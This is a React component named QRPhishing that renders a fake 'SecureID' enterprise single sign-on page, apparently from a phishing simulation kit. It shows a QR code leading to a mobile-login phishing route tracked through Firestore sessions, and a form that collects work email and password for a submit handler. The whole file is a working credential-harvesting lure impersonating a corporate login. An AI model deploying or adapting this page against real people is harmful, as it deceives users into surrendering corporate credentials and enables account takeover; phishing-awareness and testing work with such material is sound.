'use client';

import { useState, useEffect } from 'react';
import { QRCodeCanvas } from 'qrcode.react';
import { doc, setDoc, onSnapshot } from 'firebase/firestore';
import { db } from '@/lib/firebase';

export default function QRPhishing({ formData, handleChange, handleSubmit, loading }) {
  const [qrUrl, setQrUrl] = useState('');
  const [sessionId, setSessionId] = useState('');

  useEffect(() => {
    if (typeof window === 'undefined') return;

    // Generate unique session ID
    const newSessionId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
    setSessionId(newSessionId);

    // Force IP address for QR code so phone can connect
    let baseUrl = window.location.origin;
    if (baseUrl.includes('localhost') || baseUrl.includes('127.0.0.1')) {
      baseUrl = baseUrl.replace('localhost', '10.29.37.136').replace('127.0.0.1', '10.29.37.136');
    }

    const mobileUrl = `${baseUrl}/phishing/mobile-login?session=${newSessionId}`;
    setQrUrl(mobileUrl);

    if (!db) return;

    // Create session doc in Firestore
    const sessionRef = doc(db, 'qr_sessions', newSessionId);

    setDoc(sessionRef, {
      status: 'pending',
      createdAt: new Date().toISOString()
    }).catch(err => {
      console.warn("Could not create QR session in Firestore (likely permission issue):", err);
    });

    // Listen for updates
    const unsubscribe = onSnapshot(sessionRef, (docSnapshot) => {
      if (docSnapshot.exists()) {
        const data = docSnapshot.data();
        if (data.status === 'approved') {
          handleSubmit();
        }
      }
    }, (error) => {
      console.warn("Error listening to QR session:", error);
    });

    return () => unsubscribe();
  }, [handleSubmit]);

  const handleSimulateScan = async () => {
    if (!sessionId) return;

    // If we have DB access, try to update the doc to trigger the listener
    if (db) {
      try {
        await setDoc(doc(db, 'qr_sessions', sessionId), {
          status: 'approved',
          simulated: true,
          updatedAt: new Date().toISOString()
        }, { merge: true });
        return; // Listener will handle the rest
      } catch (e) {
        console.warn("Could not update Firestore for simulation, falling back to direct submit");
      }
    }

    // Fallback: just submit directly
    handleSubmit();
  };

  return (
    <div className="flex min-h-screen flex-col items-center justify-center bg-[#f0f2f5] p-4 font-sans text-slate-800">
      {/* Navbar-like header */}
      <div className="absolute top-0 left-0 w-full bg-white px-8 py-4 shadow-sm flex items-center justify-between">
        <div className="flex items-center gap-2">
          <div className="h-8 w-8 rounded bg-indigo-600 flex items-center justify-center text-white font-bold text-xl">S</div>
          <span className="text-xl font-semibold tracking-tight text-slate-700">Secure<span className="text-indigo-600">ID</span></span>
        </div>
        <div className="text-sm text-slate-500">Enterprise Single Sign-On</div>
      </div>

      <div className="w-full max-w-4xl grid grid-cols-1 md:grid-cols-2 gap-0 overflow-hidden rounded-2xl bg-white shadow-2xl ring-1 ring-slate-900/5">

        {/* Left Side: QR & Instructions */}
        <div className="p-10 flex flex-col items-center justify-center border-r border-slate-100 bg-white">
          <div className="mb-6 text-center">
            <h2 className="text-2xl font-bold text-slate-900">Scan to Login</h2>
            <p className="mt-2 text-slate-500">Open the Authenticator app on your mobile device</p>
          </div>

          <div className="relative group">
            <div className="absolute -inset-1 rounded-xl bg-gradient-to-r from-indigo-500 to-purple-500 opacity-20 blur transition duration-500 group-hover:opacity-40"></div>
            <div className="relative rounded-xl bg-white p-4 ring-1 ring-slate-900/5">
              {qrUrl ? (
                <QRCodeCanvas
                  value={qrUrl}
                  size={220}
                  level="M"
                  includeMargin={true}
                />
              ) : (
                <div className="h-[220px] w-[220px] flex items-center justify-center bg-slate-50 animate-pulse rounded">
                  <span className="text-slate-400 text-sm">Generating Secure Code...</span>
                </div>
              )}
            </div>
          </div>

          <div className="mt-8 flex items-center gap-3 text-sm text-slate-500">
            <span className="flex h-8 w-8 items-center justify-center rounded-full bg-indigo-50 text-indigo-600">
              <svg className="h-4 w-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M12 21h.01M12 15h.01M12 12h.01M12 9h.01M12 6h.01M12 3h.01" />
              </svg>
            </span>
            <p>Code expires in <span className="font-mono font-medium text-indigo-600">01:59</span></p>
          </div>

          {/* Debug/Localhost Info */}
          <div className="mt-6 w-full">
            <p className="text-[10px] text-center text-slate-300 mb-2 font-mono truncate px-4">{qrUrl}</p>
            {qrUrl.includes('localhost') && (
              <div className="mx-auto max-w-xs rounded bg-amber-50 p-2 text-[10px] text-amber-800 border border-amber-100 text-center">
                <p className="font-bold">⚠️ Localhost Detected</p>
                <p>Auto-switched to IP: 10.29.37.136</p>
                <p>Phone must be on same Wi-Fi.</p>
              </div>
            )}
          </div>
        </div>

        {/* Right Side: Manual Entry */}
        <div className="bg-slate-50 p-10 flex flex-col justify-center">
          <div className="mb-8">
            <h3 className="text-lg font-semibold text-slate-900">Or sign in manually</h3>
            <p className="text-sm text-slate-500">Enter your corporate credentials</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-5">
            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1.5">Work Email</label>
              <input
                name="email"
                type="email"
                required
                value={formData.email || ''}
                onChange={handleChange}
                className="w-full rounded-lg border-slate-200 bg-white px-4 py-2.5 text-slate-900 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm"
                placeholder="name@company.com"
              />
            </div>

            <div>
              <label className="block text-xs font-semibold uppercase tracking-wider text-slate-500 mb-1.5">Password</label>
              <input
                name="password"
                type="password"
                required
                value={formData.password || ''}
                onChange={handleChange}
                className="w-full rounded-lg border-slate-200 bg-white px-4 py-2.5 text-slate-900 shadow-sm focus:border-indigo-500 focus:ring-indigo-500 sm:text-sm"
                placeholder="••••••••"
              />
            </div>

            <div className="flex items-center justify-between">
              <label className="flex items-center">
                <input type="checkbox" className="h-4 w-4 rounded border-slate-300 text-indigo-600 focus:ring-indigo-500" />
                <span className="ml-2 text-sm text-slate-600">Remember me</span>
              </label>
              <a href="#" className="text-sm font-medium text-indigo-600 hover:text-indigo-500">Forgot password?</a>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full rounded-lg bg-indigo-600 px-4 py-2.5 text-sm font-semibold text-white shadow-sm hover:bg-indigo-500 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-600 disabled:opacity-50 disabled:cursor-not-allowed transition-all"
            >
              {loading ? 'Verifying...' : 'Sign In'}
            </button>
          </form>

          <div className="mt-8 border-t border-slate-200 pt-6">
            <button
              type="button"
              onClick={handleSimulateScan}
              className="w-full text-center text-xs text-slate-400 hover:text-indigo-600 transition-colors"
            >
              [Developer: Simulate Mobile Scan]
            </button>
          </div>
        </div>
      </div>

      <div className="mt-8 text-center text-xs text-slate-400">
        <p>&copy; 2024 SecureID Enterprise Systems. All rights reserved.</p>
        <div className="mt-2 flex justify-center gap-4">
          <a href="#" className="hover:text-slate-600">Privacy</a>
          <a href="#" className="hover:text-slate-600">Terms</a>
          <a href="#" className="hover:text-slate-600">Security</a>
        </div>
      </div>
    </div>
  );
}
